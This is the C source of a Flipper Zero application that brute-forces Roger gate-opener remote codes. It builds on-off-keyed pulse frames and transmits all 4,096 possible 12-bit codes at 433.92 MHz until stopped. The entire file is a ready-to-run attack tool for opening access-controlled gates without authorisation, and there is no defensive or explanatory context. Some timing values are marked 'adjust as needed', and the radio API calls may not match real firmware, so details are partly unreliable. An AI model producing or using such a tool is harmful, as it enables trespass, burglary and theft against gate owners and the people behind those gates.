// Roger Gate Brute-force App for Flipper Zero
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>

#define ROGER_FREQ      433920000
#define MAX_ATTEMPTS    4096
#define SEND_DELAY_US   50000

// ── Context shared between callbacks and main loop ──────────────────────────
typedef struct {
    FuriMessageQueue* input_queue; // receives InputEvent from the input cb
    volatile bool     stop;
    uint16_t          current_code;
} AppCtx;

// ── Draw callback (must be a plain function in C) ────────────────────────────
static void draw_cb(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Roger Gate BF");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 30, "Press BACK to stop");
}

// ── Input callback — just forward events to the queue ───────────────────────
static void input_cb(InputEvent* event, void* ctx) {
    AppCtx* app = ctx;
    furi_message_queue_put(app->input_queue, event, 0);
}

// ── Build a minimal OOK pulse buffer for a 12-bit Roger-gate code ───────────
//    Each '1' bit  → long pulse  (~600 µs on, ~200 µs off  — adjust as needed)
//    Each '0' bit  → short pulse (~200 µs on, ~600 µs off)
//    Values are in pairs: {on_ticks, off_ticks} at 1 MHz timer resolution.
#define TICK        100   // 100 µs per tick
#define BIT1_ON     6
#define BIT1_OFF    2
#define BIT0_ON     2
#define BIT0_OFF    6
#define SYNC_ON     1
#define SYNC_OFF    31

static size_t build_pulse_buffer(uint16_t code, uint32_t* buf, size_t buf_len) {
    // buf must hold: 1 sync pair + 12 bit pairs + 1 trailing on = 27 uint32_t
    if(buf_len < 27) return 0;

    size_t idx = 0;

    // Sync
    buf[idx++] = SYNC_ON  * TICK;
    buf[idx++] = SYNC_OFF * TICK;

    // 12 data bits, MSB first
    for(int i = 11; i >= 0; i--) {
        if((code >> i) & 1) {
            buf[idx++] = BIT1_ON  * TICK;
            buf[idx++] = BIT1_OFF * TICK;
        } else {
            buf[idx++] = BIT0_ON  * TICK;
            buf[idx++] = BIT0_OFF * TICK;
        }
    }

    // Trailing high (marks end of frame)
    buf[idx++] = BIT1_ON * TICK;

    return idx; // number of entries written
}

// ── Transmit one code word ───────────────────────────────────────────────────
static void send_code(uint16_t code) {
    uint32_t pulse_buf[27];
    size_t   pulse_count = build_pulse_buffer(code, pulse_buf, 27);
    if(pulse_count == 0) return;

    // Configure the radio
    furi_hal_subghz_reset();
    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok650Async);
    furi_hal_subghz_set_frequency_and_path(ROGER_FREQ);

    // Hand the pulse buffer to the async DMA transmitter
    furi_hal_subghz_start_async_tx(pulse_buf, pulse_count);

    // Wait until transmission completes (or time out after 200 ms)
    uint32_t deadline = furi_get_tick() + furi_ms_to_ticks(200);
    while(!furi_hal_subghz_is_async_tx_complete()) {
        if(furi_get_tick() >= deadline) break;
        furi_delay_us(1000);
    }

    furi_hal_subghz_stop_async_tx();
    furi_hal_subghz_sleep();

    furi_delay_us(SEND_DELAY_US);
}

// ── App entry point ──────────────────────────────────────────────────────────
int32_t roger_gate_app(void* p) {
    UNUSED(p);

    AppCtx app = {
        .input_queue = furi_message_queue_alloc(8, sizeof(InputEvent)),
        .stop         = false,
        .current_code = 0,
    };

    // GUI setup
    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, &app);
    view_port_input_callback_set(vp, input_cb, &app);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);

    // Main brute-force loop
    while(!app.stop && app.current_code < MAX_ATTEMPTS) {
        send_code(app.current_code);

        // Drain any queued input events
        InputEvent event;
        while(furi_message_queue_get(app.input_queue, &event, 0) == FuriStatusOk) {
            if(event.type == InputTypeShort && event.key == InputKeyBack) {
                app.stop = true;
            }
        }

        app.current_code++;
    }

    // Cleanup
    gui_remove_view_port(gui, vp);
    furi_record_close(RECORD_GUI);
    view_port_free(vp);
    furi_message_queue_free(app.input_queue);

    return 0;
}
